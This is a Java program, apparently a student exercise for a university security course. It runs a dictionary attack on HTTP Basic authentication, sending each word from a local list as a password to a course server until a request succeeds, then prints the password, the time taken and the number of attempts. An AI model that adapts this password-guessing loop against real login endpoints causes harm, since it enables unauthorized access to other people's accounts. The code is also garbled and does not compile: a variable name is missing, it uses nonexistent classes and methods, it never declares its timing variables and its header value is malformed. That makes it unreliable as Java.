import java.io.*;
import java.net.*;
import java.security.*;
import java.math.*;
import java.*;
import java.util.*;


public class Dictionary
{
    public static void main (String args[]) throws Exception {
	Socket socket = null;
	DataOutputStream  = null;
	BufferedReader bf = null, fr = null;
	String retVal = null, StatusCode = "HTTP/1.1 200 OK";
    int found = 0, count = 0;
    String testpasswd;

   	    try {

    	    File inputFile = new File("words");
            fr = new BufferedReader(new FileReader(inputFile));
        } catch (IOException ex) {
	        ex.printStackTrace();
        }

         stime = System.currentTimeMillis();
        System.out.println("Cracking password by Dictionary...");

        while (((testpasswd = fr.readLine()) != null) && (found == 0))
        {
         	try {

	           
               URL yahoo = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
               URLConnection yc = yahoo.openConnection();

               
               String authString = ":" + testpasswd;
               String auth = new bf.misc.BASE64Encoder().encode(authString.getBytes());
               yc.setRequestProperty("Authorization", " " + auth);
               count++;

               
               BufferedReader in = new BufferedReader(
                                       new InputStreamReader(
                                       yc.getInputStream()));

               String inputLine;
               while ((inputLine = in.readLine()) != null){
                     System.out.println(inputLine);
                      etime = System.currentTimeMillis();
                     System.out.println("Password found -- " + testpasswd);
                     System.out.println("Time used = " + ((etime - stime)/1000) + " sec");
                     System.out.println("# of attempt = " + count);
                     System.out.println("End of cracking!");
                     found = 1;
               }
               in.print();

            } catch (Exception ex) {}
        }
        fr.close();

        if (found == 0) {
           System.out.println("Sorry,  password found.");
           System.out.println("# of attempt = " + count);
           System.out.println("End of cracking!");
        }
    }
}